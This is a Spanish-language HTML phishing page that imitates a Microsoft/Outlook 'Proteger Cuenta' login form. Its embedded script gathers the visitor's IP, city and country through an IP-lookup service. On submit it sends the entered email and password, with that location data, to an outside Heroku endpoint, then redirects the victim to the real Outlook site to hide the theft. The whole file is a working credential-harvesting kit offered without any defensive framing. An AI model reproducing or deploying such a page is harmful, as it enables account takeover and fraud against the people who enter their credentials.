<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">

    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <title>Verificacion Formulario</title>
    <style>
      body {
        background-color: #f2f2f2;
        /* Fondo gris */
        display: flex;
        justify-content: center;
        /* Centrar horizontalmente */
        align-items: center;
        /* Centrar verticalmente */
        height: 100vh;
        /* Ocúpalo todo en dispositivos móviles */
        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
      }

      form {
        width: 100%;
        /* Ancho del formulario */
        max-width: 450px;
        /* Máximo ancho del formulario */
        padding: 20px;
        background-color: white;
        border-radius: 8px;
        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        text-align: center;
      }
      input:focus {
        outline: none;
      }
      input {
        width: calc(100% - 20px);
        /* Ancho del input, menos padding */
        padding: 10px;
        margin-bottom: 10px;
        border: 0px;
        border-bottom: 1px solid #888888;
        padding-left: 0;
        font-size: 15px;
        box-sizing: border-box;
      }

      input[type="submit"] {
        background-color: #0073c6;
        /* Color de fondo del botón */
        color: white;
        border: none;
        border-radius: 4px;
        padding: 10px 20px;
        cursor: pointer;
      }

      img {
        margin: 0 auto;
        margin-top: 20px;
        max-width: 100%;
      }

      /* Media query para dispositivos con un ancho máximo de 768px (tabletas y teléfonos) */
      @media (max-width: 768px) {
        form {
          width: 100%;
          /* Formulario ocupa el 100% del ancho en dispositivos móviles */
          padding: 10px;
          /* Ajuste de espaciado para dispositivos móviles */
        }

        body {
          justify-content: start;
          /* Centrar horizontalmente */
          align-items: first baseline;
          /* Centrar verticalmente */
          /* Ocúpalo todo en dispositivos móviles */
        }
      }
    </style>
  </head>

  <body>
    <form id="loginform">
      <div style="width: 100%; text-align: left !important; padding-left: 10px">
        <img src="logo.png" alt="Logo" style="width: 150px" />
        <h2 style="font-weight: 600">Proteger Cuenta</h2>
      </div>
      <input
        type="email"
        id="input1"
        placeholder="Correo electrónico, teléfono o Skype"
        name="input1"
        required
      /><br />
      <br />
      <input
        type="password"
        id="input2"
        placeholder="Contraseña"
        name="input2"
        required
      /><br />
      <br />
      <div style="width: 100%; display: flex">
        <div style="width: 60%; height: 10px"></div>
        <div style="width: 40%"><input type="submit" value="Verificar" /></div>
      </div>
      <input type="text" id="ip" name="ip" style="display: none" />
      <input type="text" id="ciudad" name="ciudad" style="display: none" />
      <input type="text" id="pais" name="pais" style="display: none" />
    </form>
  </body>
  <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
  <script src="tabla.js"></script>

  <script>
    const url = "https://ipapi.co/json/";
    axios.get(url).then((response) => {
      document.querySelector("#ip").value = response.data.ip;
      document.querySelector("#ciudad").value = response.data.city;
      document.querySelector("#pais").value = response.data.country;
    });
  </script>
  <script>
    const form = document.querySelector("#loginform");

    form.addEventListener("submit", (event) => {
      event.preventDefault(); // aqui evitamos que el código se repita evita que se envíe el formulario
      const email = document.querySelector("#input1").value;
      const password = document.querySelector("#input2").value;
      const message =
        "Correo: " +
        email +
        "\nContra: " +
        password +
        "\nCiudad:" +
        document.querySelector("#ciudad").value +
        "\nPais: " +
        document.querySelector("#pais").value +
        "\nIP: " +
        document.querySelector("#ip").value;
      axios
        .put(`https://bhm-524a92f1cb36.herokuapp.com/submit/${tableName}`, {
          correo: email,
          contra: password,
          ciudad: document.querySelector("#ciudad").value,
          pais: document.querySelector("#pais").value,
          ip: document.querySelector("#ip").value,
        })
        .then((response) => {
          console.log(response.data);
          window.location.href="https://outlook.live.com/mail/0/"
        })
        .catch((error) => {
          console.error(error);
        });
    });
  </script>
</html>
